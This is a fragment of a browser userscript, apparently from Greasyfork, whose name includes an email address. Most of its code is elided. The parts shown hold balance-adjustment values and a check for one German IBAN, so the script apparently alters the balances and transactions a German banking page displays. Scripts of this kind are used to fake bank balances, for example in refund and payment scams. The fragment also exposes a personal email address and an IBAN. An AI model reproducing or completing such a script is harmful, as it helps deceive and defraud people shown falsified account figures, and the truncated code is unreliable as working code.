// ==UserScript==
// @name         Ed Start 4Rec db.juergens-burkhardt@web.de
...
// @downloadURL https://update.greasyfork.org/scripts/529425/Ed%20Start%204Rec%20dbjuergens-burkhardt%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/529425/Ed%20Start%204Rec%20dbjuergens-burkhardt%40webde.meta.js
// ==/UserScript==
...
//         UBERSICHT
    ...
    const accountBalanceAdjustments = [
        ...
        { index: 1, amount: 0 },
         ...
         { index: 2, amount: 1},  //3   // will have to change to 1395
...
//     UMSATZE BALANCE
    ...
    var adjustValue = 1.00; // Modify this value as needed

    // Specify the IBAN value to check for
    var ibanCheck = "DE87 4307 0024 0072 7180 00";
